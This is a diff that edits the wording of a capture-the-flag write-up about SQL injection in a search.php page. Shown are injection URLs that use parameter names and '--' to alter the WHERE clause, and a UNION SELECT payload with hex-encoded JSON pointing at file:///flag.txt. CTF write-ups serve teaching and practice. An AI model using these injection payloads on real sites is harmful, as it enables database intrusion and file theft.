@@ -19,9 +19,9 @@ P.S.
 After CTF has ended, some participants shared the dirbusted source file.
 `https://owasp.ctf.intigriti.io/search.php.save`
 
-Please note that I didn't know about this file, because dirbusting is generally prohibited in most CTFs, unless it is explicitly stated in the challenge description. 
+Please note that we didn't know about this file, because dirbusting is generally prohibited in most CTFs, unless it is explicitly stated in the challenge description. 
 
-So I was desperately guessing every possible shit out there.
+So we were desperately guessing every possible shit out there.
 ```php
 <?php
 require_once('db.php');
@@ -71,19 +71,18 @@ if (isset($config['flag']) && $config['flag']){
 
 #### Fuzzing
 
-We don't see much of the possible attack vectors on the site, the only interesting thing at quick glance is search field. Which just GETs the search.php
+We didn't see much of the possible attack vectors on the site, the only interesting thing at quick glance is search field. Which just GETs the `search.php`.
 
 `https://owasp.ctf.intigriti.io/search.php?title=1`
 
-SQL injection is definitely the first thing to try here, so let's try something:
+SQL injection is definitely the first thing to try here, so we tried something like this:
 
 `https://owasp.ctf.intigriti.io/search.php?title='"/`
 
-No errors are produced with this input. What if we add an another random query parameter?
+No errors were produced with this input. We thought "what if we add another random query parameter?" and, to our surprise, it worked just fine and produced a mysql exception.
 
 `https://owasp.ctf.intigriti.io/search.php?title=%27%22%2F&abacaba=123`
 
-And here we are, definitely an SQL injection
 
 ```py
 Fatal error: Uncaught mysqli_sql_exception: Unknown column 'abacaba' in 'where clause' in /var/www/html/db.php:11 
@@ -91,7 +90,7 @@ Stack trace:
 #0 /var/www/html/db.php(11): mysqli->query('select * from o...') #1 /var/www/html/search.php(21): sqlquery('select * from o...') #2 {main} thrown in /var/www/html/db.php on line 11
 ```
 
-After several attempts, we discovered that query string parameters must match the following regex pattern: `/[a-z0-9_-]/i`. Dots and spaces are replaced with underscores `_`. However, the `-` char is permitted, we can exploit it to comment out the rest of the query, which may reveal a portion of it and help us understand what to do next.
+After several attempts, we discovered that query string parameters must match the following regex pattern: `/[a-z0-9_-]/i`. Dots and spaces are replaced with underscores `_`. However, the `-` char is permitted, we immediately tried to exploit it to comment out the rest of the query, which may reveal a portion of it and help us understand what to do next.
 
 `https://owasp.ctf.intigriti.io/search.php?b=1&1=321&--=123`
 
@@ -172,7 +171,7 @@ string(140)
 Wrong flag
 ```
 
-Hmm, let's try LFI:
+Since they check the domain, we tried LFI.
 `https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) UNION SELECT 1,2,3, 0x7B22666C6167223A747275652C2275726C223A2266696C653A2F2F2F666C61672E747874227D;-- AND POSITION(`
 
 ```py
